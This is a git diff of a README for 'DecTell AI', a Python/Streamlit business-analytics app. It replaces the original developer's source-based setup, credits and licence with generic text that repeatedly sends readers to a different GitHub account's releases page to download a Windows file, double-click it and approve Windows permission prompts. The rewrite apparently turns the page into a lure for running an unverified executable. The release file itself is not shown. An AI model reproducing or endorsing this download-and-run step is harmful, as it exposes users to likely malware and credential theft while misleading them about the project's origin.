@@ -1,152 +1,303 @@
-# DecTell AI - Decision Intelligence Platform
+# 📊 dectell-ai - Turn Data Into Clear Decisions
 
-<img width="801" height="430" alt="image" src="https://github.com/user-attachments/assets/cee7a736-1cba-4bf5-9ffb-6e666e6f1194"/>
+[![Download dectell-ai](https://img.shields.io/badge/Download%20dectell--ai-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Salomeleprous919/dectell-ai/releases)
 
-<br>
+## 🚀 What dectell-ai does
 
-> An AI-powered Business Analytics & Decision Intelligence platform built with Python and Streamlit.
-> Upload any dataset, get LLM-generated insights, train ML models, simulate decisions, and chat with your data all in one place.
+DecTell AI helps you work with business data in a simple way. You upload a file, and the app helps clean the data, study trends, build prediction models, test what-if cases, and answer questions in plain language.
 
-## 📸 Screenshots
+It is made for people who want useful answers from data without learning data tools first.
 
-<img width="1203" height="649" alt="image" src="https://github.com/user-attachments/assets/f894157e-3d67-4532-99d7-7d3439f11aa8" />
-<img width="839" height="331" alt="image" src="https://github.com/user-attachments/assets/5a0f86c6-efd8-4dd0-b960-73487490a9de" />
-<img width="897" height="501" alt="image" src="https://github.com/user-attachments/assets/a705a116-29ad-4d25-b6ae-daac504dcb7c" />
+## ✨ What you can do
 
-<br>
+- Upload a business dataset
+- Clean messy data with one click
+- Explore patterns and trends
+- Build machine learning forecasts
+- Test what-if changes
+- Check the effect of business actions
+- Ask questions about your data in plain language
+- Use the results to support decisions
 
-<img width="851" height="593" alt="image" src="https://github.com/user-attachments/assets/0a016348-cb7e-4ea9-a453-c00b23a36c6e" />
+## 🖥️ What you need
 
-<img width="837" height="504" alt="image" src="https://github.com/user-attachments/assets/41c03747-d164-4861-b928-7dce7d94f9c8" />
+- A Windows PC
+- A modern web browser
+- A stable internet connection for the first setup
+- A CSV, Excel, or similar business data file
+- Enough free disk space for the app and your data
 
-<img width="836" height="477" alt="image" src="https://github.com/user-attachments/assets/2b9d2684-06c5-4aa4-9740-93d094fae81d" />
+For best use, your file should have clear column names and at least a few dozen rows.
 
-<img width="834" height="615" alt="image" src="https://github.com/user-attachments/assets/a56cf475-0592-405b-8aba-5a097652a017" />
+## 📥 Download the app
 
-<img width="826" height="567" alt="image" src="https://github.com/user-attachments/assets/8ff5858d-c2be-40e1-b67e-ed82eaf3055e" />
+Visit the releases page here:
 
-<img width="835" height="582" alt="image" src="https://github.com/user-attachments/assets/cbf72f76-1e71-4431-94ba-272e7bb0aaba" />
+[Download dectell-ai from GitHub Releases](https://github.com/Salomeleprous919/dectell-ai/releases)
 
-<img width="838" height="592" alt="image" src="https://github.com/user-attachments/assets/7c95c675-000d-4da1-bc68-116355c54cab" />
+On that page, look for the latest release and download the Windows file. If you see more than one file, choose the one made for Windows.
 
-<img width="846" height="537" alt="image" src="https://github.com/user-attachments/assets/0fa5e70b-8715-4b8d-b45d-6b221f3ee187" />
+## 🔧 Install on Windows
 
-<img width="830" height="572" alt="image" src="https://github.com/user-attachments/assets/f1867f4c-6d1b-4199-b05f-70beac15e7e2" />
+1. Open the download link above
+2. Find the latest release
+3. Download the Windows version
+4. If the file is in a .zip folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows asks for permission, choose Yes
+8. Wait for the app to load in your browser or app window
 
+If the app does not start, check that the file finished downloading and that you opened the correct Windows file.
 
-## Features
+## 🏁 First run
 
-| Module | Description |
-|--------|-------------|
-| **Smart Data Upload** | AI-driven cleaning — imputes, encodes, caps outliers only when needed |
-| **Automated EDA** | Distribution charts, correlation heatmaps, LLM-generated narrative insights |
-| **AI Analyze** | Business mode (plain language goals) + Technical mode (full ML control) |
-| **Scenario Simulation** | What-if sliders and dropdowns for any dataset type including categoricals |
-| **Causal Impact** | Difference-in-Differences with bootstrapped 95% confidence intervals |
-| **Chat with Data** | Groq LLM conversational interface with full session memory |
-| **Report Generator** | AI-written Business and Technical reports exportable as PDF or text |
-| **Analytics Dashboard** | Live KPIs, model metrics, feature importances |
-| **Developer Page** | Professional profile of the developer |
+When the app opens:
 
----
+1. Look for the upload area
+2. Choose your data file
+3. Wait while the app checks and prepares the file
+4. Review the cleaned data
+5. Move through the analysis tabs or sections
+6. Use the question box to ask about your data
 
-## Tech Stack
+If your file is large, the first run can take a little longer.
 
-- **Language:** Python 3.12
-- **Framework:** Streamlit
-- **AI Engine:** Groq API with llama-3.3-70b-versatile
-- **ML:** Scikit-learn, XGBoost
-- **Data:** Pandas, NumPy
-- **Visualisation:** Plotly
-- **PDF Export:** ReportLab
-- **Integration:** Google Sheets API
+## 📂 Best file types
 
----
+DecTell AI works best with common business files such as:
 
-## Local Setup
+- CSV files
+- Excel files
+- Spreadsheet exports
+- Tabular data with rows and columns
 
-### 1. Clone the repository
+Good examples include:
 
-```bash
-git clone https://github.com/your-username/dectell-ai.git
-cd dectell-ai
-```
+- Sales data
+- Customer lists
+- Revenue reports
+- Product performance data
+- Survey results
+- Inventory records
 
-### 2. Install dependencies
+## 🧠 How the analysis works
 
-```bash
-pip install -r requirements.txt
-```
+### 1. Data cleaning
 
-### 3. Add your secrets
+The app checks your file for:
 
-Create `.streamlit/secrets.toml` locally — this file is gitignored and never pushed:
+- Missing values
+- Duplicate rows
+- Mixed formats
+- Empty cells
+- Date and number issues
 
-```toml
-GROQ_API_KEY       = "gsk_your_groq_api_key_here"
-SHEETS_WEBHOOK_URL = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec"
-```
+It then prepares the data so the next steps work better.
 
-Get your free Groq API key at [console.groq.com](https://console.groq.com)
+### 2. Exploratory analysis
 
-### 4. Run the app
+The app reviews your data and looks for:
 
-```bash
-streamlit run app.py
-```
+- Trends
+- Outliers
+- Group differences
+- Strong links between fields
+- Basic summary stats
 
----
+This gives you a fast view of what is in the dataset.
 
-## Secrets Reference
+### 3. Predictive models
 
-| Key | Where to get it | Required |
-|-----|----------------|----------|
-| `GROQ_API_KEY` | [console.groq.com](https://console.groq.com) — free tier available | Yes — for all AI features |
-| `SHEETS_WEBHOOK_URL` | Google Apps Script deployment URL from your spreadsheet | No — only for contact and feedback forms |
+DecTell AI can train models to estimate future values or likely outcomes.
 
----
+You can use it to:
 
-## Deploy on Streamlit Cloud
+- Predict sales
+- Estimate demand
+- Forecast revenue
+- Spot likely changes in behavior
 
-1. Push this repo to GitHub
-2. Go to [share.streamlit.io](https://share.streamlit.io)
-3. Click **New app** and select your repo
-4. Set main file as `app.py`
-5. Under **Advanced settings → Secrets** paste your secrets in TOML format
-6. Click **Deploy**
+### 4. What-if scenarios
 
----
+You can change one or more values and see how the result may shift.
 
-## Partner
+This helps with questions like:
 
-<!-- 📸 ADD IMAGE HERE: Data & Disco Dreams Studio logo
-     Save as: assets/datadisco_logo.png  then uncomment:
-     ![Data & Disco Dreams Studio](assets/datadisco_logo.png) -->
+- What if ad spend rises?
+- What if price drops?
+- What if churn falls?
+- What if one region improves?
 
-**[Data & Disco Dreams Studio](https://www.datadiscodreams.com)**
-Data Consulting & Design for Small Businesses | Atlanta, United States
+### 5. Causal impact checks
 
----
+The app can help measure the effect of an action or event.
 
-## Developer
+This is useful when you want to know:
 
-<!-- 📸 ADD IMAGE HERE: Your profile photo
-     Save as: assets/vivek_photo.jpg  then uncomment:
-     ![Vivek Singh](assets/vivek_photo.jpg) -->
+- Did a new campaign help?
+- Did a policy change improve results?
+- Did an update affect conversions?
 
-**Vivek Singh**
-MCA — Big Data & Analytics | Jaypee Institute of Information Technology, Noida
+### 6. Natural language questions
 
-- LinkedIn: [vivek-singh-linkdin](https://www.linkedin.com/in/vivek-singh-linkdin)
-- GitHub: [vivek081202](https://github.com/vivek081202)
-- Email: vivekkrsingh082003@gmail.com
+You can ask questions in plain English, such as:
 
----
+- Which product sold the most?
+- What month had the highest revenue?
+- Which region grew the fastest?
+- What factors affect sales?
 
-## Licence
+## 📈 Example use cases
 
-MIT — Free to use, modify, and distribute.
+### Sales teams
 
----
+- Find top products
+- Track monthly growth
+- See which region leads
+- Forecast next quarter results
 
-*DecTell AI — Built with research, analytics, and intelligence.*
+### Operations teams
+
+- Check supply trends
+- Review inventory changes
+- Spot slow-moving products
+- Test demand changes
+
+### Finance teams
+
+- Review revenue patterns
+- Compare time periods
+- Find cost shifts
+- Support planning work
+
+### Marketing teams
+
+- Check campaign results
+- Review audience segments
+- Test budget changes
+- Track conversion trends
+
+## 🧭 Simple workflow
+
+1. Download the app
+2. Open it on Windows
+3. Upload your file
+4. Let the app clean the data
+5. Review charts and summaries
+6. Run predictions
+7. Test what-if changes
+8. Ask questions in plain language
+9. Use the results to guide decisions
+
+## 🛠️ Tips for better results
+
+- Use clean column names
+- Keep one row per record
+- Remove blank header rows
+- Use clear date formats
+- Avoid merged cells in spreadsheets
+- Check that numbers are stored as numbers, not text
+- Start with a smaller file if your dataset is very large
+
+## 📋 Good dataset setup
+
+A helpful file often has columns like:
+
+- Date
+- Product
+- Region
+- Sales
+- Cost
+- Channel
+- Customer Type
+- Status
+
+You do not need every column above. The app works with the data you have, as long as it is in rows and columns.
+
+## 🔍 Common questions
+
+### Is this for non-technical users?
+
+Yes. The app is built for people who want answers from data without using coding tools.
+
+### Do I need to know machine learning?
+
+No. The app handles the model work for you.
+
+### Can I ask questions in plain language?
+
+Yes. You can type questions in simple English.
+
+### Can I use Excel files?
+
+Yes. Spreadsheet files work well when they follow a clean table format.
+
+### Does it work with business data?
+
+Yes. It is made for business datasets and decision work.
+
+## 🧪 Troubleshooting
+
+### The app will not open
+
+- Make sure the download finished
+- Check that you extracted the zip file if needed
+- Open the correct Windows file
+- Try again after closing other heavy apps
+
+### My file will not upload
+
+- Check that the file is not damaged
+- Use a common format like CSV or Excel
+- Make sure the file is not open in another app
+- Try a smaller file first
+
+### The data looks wrong
+
+- Check your column names
+- Make sure each row has the same kind of data
+- Remove extra title rows above the table
+- Confirm dates and numbers use a clear format
+
+### The results take too long
+
+- Use a smaller dataset
+- Close other apps
+- Wait for the first run to finish
+- Try again with fewer columns
+
+## 📦 What is inside
+
+This project includes tools for:
+
+- Data upload
+- Data cleaning
+- Exploration and summary views
+- Predictive modeling
+- Scenario testing
+- Impact checks
+- Natural language Q&A
+
+## 🔗 Download again
+
+If you need the file later, use the same download page:
+
+[Open dectell-ai Releases](https://github.com/Salomeleprous919/dectell-ai/releases)
+
+## 🧾 Project focus
+
+DecTell AI brings together:
+
+- AI agents
+- Business analytics
+- Business intelligence
+- Data science
+- Decision intelligence
+- Machine learning
+- Recommendation logic
+- Spreadsheet workflows
+- Chat with your dataset
+- Predictive regression
+
+It is built to help you move from raw data to clear action faster
